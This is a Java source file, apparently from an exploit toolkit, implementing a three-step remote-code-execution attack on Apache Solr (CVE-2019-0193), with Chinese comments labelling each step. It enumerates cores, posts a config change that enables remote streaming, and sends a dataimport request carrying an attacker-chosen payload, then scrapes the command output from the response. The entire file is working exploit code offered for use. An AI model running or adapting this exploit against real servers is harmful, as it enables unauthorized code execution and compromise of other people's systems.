package org.example.exp;

import org.example.tools.HttpUtil;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE_2019_0193 {
    public static String webpath1 = "/solr/admin/cores";
    public static String payload2 = "{\"set-property\": {\"requestDispatcher.requestParsers.enableRemoteStreaming\": true}, \"set-property\": {\"requestDispatcher.requestParsers.enableStreamBody\": true}}";//用于第二步
    public static String ContentTypeJson = "application/json";
    public static String ContentTypeFormData = "multipart/form-data; boundary=------------------------aceb88c2159f183f";
    public static String postData = "--------------------------aceb88c2159f183f\r\n" +
            "Content-Disposition: form-data; name=\"stream.body\"\r\n" +
            "\r\n" +
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" +
            "<RDF>\r\n" +
            "<item/>\r\n" +
            "</RDF>\r\n" +
            "\r\n" +
            "--------------------------aceb88c2159f183f--";;

    /*
    * 第一步
    * 访问/solr/admin/cores获取core
    * */
    public static String step1(String url){
        String responsexml = HttpUtil.doGet(url+webpath1);
        String core = Compile(responsexml,"str","name=\"name\"","([^<]*)").get(0);
        String webpath = Compile(responsexml,"str","name=\"instanceDir\"","([^<]*)").get(0);

        return core+"!!!"+webpath;
    }
    /*
    * 第二步
    * 访问/solr/{core}/config
    * 修改configoverlay.json文件中的配置 以启用远程流的相关选项 .enableStreamBody .enableRemoteStreaming
    * */
    public static String step2(String url,String core) throws IOException {
        String webpath = "/solr/"+core+"/config";
        System.out.println(webpath);
        String response = HttpUtil.doPost(url+webpath,payload2,ContentTypeJson);
        return "第二个数据包发送成功。\n";
    }

    /*
    * 第三步
    * 访问/solr/{core}}/dataimport，直接代码执行
    * */
    public static String step3(String url,String core,String payload) throws IOException {
        String webpath = "/solr/"+core+"/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core="+core+"&name=dataimport&dataConfig="+payload;
        String responsexml = HttpUtil.doPost(url+webpath,postData,ContentTypeFormData);
        String result = Compile(Compile(responsexml,"arr","name=\"title\"","(.*)").get(0),"str","","(.*)").get(0);
        return result;
    }

    /*
    * source xml格式文本
    * element 节点名
    * attr节点的属性
    * 获取指定节点的指定属性值的文本
    * 返回对象是所有符合规则的文本
    * */
    public static List<String> Compile(String source,String element,String attr,String pattern){
        String result = "false";
        List<String> list1 = new ArrayList<>();
        String reg = "<" + element + ".*" + attr +">"+pattern+"</"+element+">";
        Matcher m = Pattern.compile(reg).matcher(source);
        while (m.find()) {
            result = m.group(1);
            list1.add(result);
        }
        return list1;
    }

}
